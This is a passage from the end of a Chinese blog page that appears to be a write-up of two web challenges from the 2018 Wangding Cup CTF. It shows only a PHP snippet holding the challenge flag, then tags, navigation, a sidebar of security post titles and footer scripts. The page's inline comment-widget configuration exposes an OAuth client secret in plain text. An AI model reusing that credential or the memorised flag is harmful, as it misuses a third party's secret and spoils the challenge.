<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$flag</span>=<span class="string">&quot;flag&#123;362afbce-ac8e-438f-b969-9b1ce19f874b&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><div class="post-copyright"><script type="text/javascript" src="/js/copyright.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copyright.css"><p><span>本文标题：</span>记2018年网鼎杯的两个Web</p><p><span>文章作者：</span>zjun</p><p><span>发布时间：</span>2020-04-09</p><!--p--><!--    span= __('copyright_update_prefix')--><!--    = page.updated.format(config.date_format)--><p><span>原始链接：</span><a href="/2020/wangdingcup-2018-web.html">https://blog.zjun.info/2020/wangdingcup-2018-web.html</a><span class="copy-path"><i class="fa fa-clipboard" data-clipboard-text="https://blog.zjun.info/2020/wangdingcup-2018-web.html"></i></span></p><p><span>版权声明：</span>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！</p></div><br><script type="text/javascript" src="/js/share.js?v=1.0.0" async></script><a class="article-share-link" data-url="https://blog.zjun.info/2020/wangdingcup-2018-web.html" data-id="ckletkpxr002g4pry2ele730e" data-qrcode="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKUlEQVR42u3awU7EMAwE0P3/n4YzgpaZmEVq8nJCFQ15PRg79usVr49v6+r599+53/Pqr7zesTAwMB7LSI5y//z+EAky2fOXz4SBgXEA4z4g3gfBhNfGzPxsGBgYGPdpXHKIJHC3nw8DAwNjbbu2+MTAwMBoGUkRu3b11gbft9fiGBgYD2S0wfE/f35LfwMDA+NRjI9ytcE3KVzbtugPu2FgYGzNyANcctykQE2GKtrzYGBg7M2Yl5rz0a685XD5BAMD4wBGEljnLYF27CwJ7l8CLgYGxqaM+V3Wfcm6dqmXD2RgYGCcwGgP1yaUkwT0PvX84f8GBgbGpox8SGstlq9duuUDHPWsGQYGxmMZyXZtWJxMRCy2EDAwMA5j/G2COD9o9BYGBsamjLU0rn1rbZ+iaYGBgXEAY94mXEv75nUoBgbGOYy1Q88bBm1ntZ4ZwcDA2JrxV6MVbfBtR81G94IYGBgPZCRHTzAtsm2XXs6MYGBgbMqYtyrnaV87kHG5GwYGxmGMNqTmKePaKFhUEmNgYBzAaFd+cZ/z2nt+DAwMjDxFaxuW7dDGKOBiYGA8nDEJspN2QvuBoos2DAyMTRn5aluVeW+xTSvb0RAMDIw9GGsDFm24nAx8RO0EDAyMAxj5kFabtOUF8NooGwYGBsbaRf8koUzexcDAwGjDaFuUvmMUAwMD4wRGUsS2RWneVGhTRgwMjNMYbd5VX4TFLc/2Ag4DA+MAxifT7tE/ShiWIwAAAABJRU5ErkJggg==">分享</a><div class="tags"><a href="/tags/CTF/"><i class="fa fa-tag"></i>CTF</a><a href="/tags/Web/"><i class="fa fa-tag"></i>Web</a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><i class="fa fa-tag"></i>反序列化漏洞</a><a href="/tags/PHP/"><i class="fa fa-tag"></i>PHP</a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa fa-tag"></i>代码审计</a><a href="/tags/WriteUp/"><i class="fa fa-tag"></i>WriteUp</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/"><i class="fa fa-tag"></i>SQL注入</a><a href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"><i class="fa fa-tag"></i>网鼎杯</a></div><div class="post-nav"><a class="pre" href="/2020/solutions-to-some-problems-with-linux-and-dwm.html">linux、dwm关于部分问题的解决方案</a><a class="next" href="/2020/frp-intranet-penetration.html">frp内网穿透原理及实战应用</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=1.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=1.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=1.0.0"></script><script>var gitalk = new Gitalk({
  clientID: 'a29c90b69a24ed5a320d',
  clientSecret: '62b4bde8f0a28a1a782e49c56380cb10d365cd87',
  repo: 'gitalk',
  owner: 'z1un',
  proxy: 'https://netnr-proxy.cloudno.de/https://github.com/login/oauth/access_token',
  admin: ['z1un'],
  id: md5(location.pathname),
  distractionFreeMode: false
})
gitalk.render('container')
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Other/">Other</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/audit-typecho-deserialize-to-rce.html">审计 Typecho 反序列化导致任意代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/attacking-jwt-authentication.html">JWT鉴权攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/about-the-online-tools-site.html">关于在线工具站点</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/z1-aggressorscripts.html">最近写的一款Cobalt Strike插件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/analysis-of-flask-ssti-template-injection.html">浅析Flask SSTI模板注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/neovim-configuration-file-in-a-fast-scripting-scenario.html">快速脚本编写场景下的neovim配置文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/kerberos-protocol-to-ticket-forgery.html">Kerberos协议到票据伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ntlm-authentication-to-pth-attack.html">NTLM认证协议到Pass The Hash攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ciscn-2020-preliminaries.html">CISCN 2020 线上初赛部分WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/from-windows-local-authentication-to-obtaining-hash.html">由Windows本地认证到Hash抓取</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.w3bsafe.cn/" title="w3bsafe安全团队" target="_blank">w3bsafe安全团队</a><ul></ul><a href="http://www.c-hasel.cn/" title="Corey" target="_blank">Corey</a><ul></ul><a href="http://www.snow404.cn/" title="snow" target="_blank">snow</a><ul></ul><a href="http://www.hackxc.cc/" title="小陈" target="_blank">小陈</a><ul></ul><a href="https://0x20h.com/" title="Sp4ce" target="_blank">Sp4ce</a><ul></ul><a href="https://blog.cdusec.com/" title="成都大学信息安全内部博客" target="_blank">成都大学信息安全内部博客</a><ul></ul><a href="https://dna049.com/" title="dna049" target="_blank">dna049</a><ul></ul><a href="https://jokerm.com/" title="JokerM's Palace" target="_blank">JokerM's Palace</a><ul></ul><a href="https://superj.site/" title="Opt1mus" target="_blank">Opt1mus</a><ul></ul><a href="https://zgao.top/" title="zgao" target="_blank">zgao</a><ul></ul><a href="https://blog.happysec.cn/" title="小北" target="_blank">小北</a><ul></ul><a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><!--#footer= 'Copyright © ' + date(Date.now(), 'YYYY') + ' '--><!--  a(href=url_for('.'), rel='nofollow')= config.title + '.'--><!--  |  Powered by--><!--  a(rel='nofollow', target='_blank', href='https://hexo.io')  Hexo.--><!--  a(rel='nofollow', target='_blank', href='https://github.com/tufu9441/maupassant-hexo')  Theme--><!--  |  by--><!--  a(rel='nofollow', target='_blank', href='https://github.com/pagecho')  Cho.--><div id="footer">Copyright © 2021 <a rel="nofollow" target="_blank" href="https://www.zjun.info"> ZJUN |</a><a rel="nofollow" target="_blank" href="https://beian.miit.gov.cn/"> 蜀ICP备20009085号 |</a><a rel="nofollow" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=51010802000845"> 川公网安备51010802000845号</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=1.0.0"><script type="text/javascript" src="/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>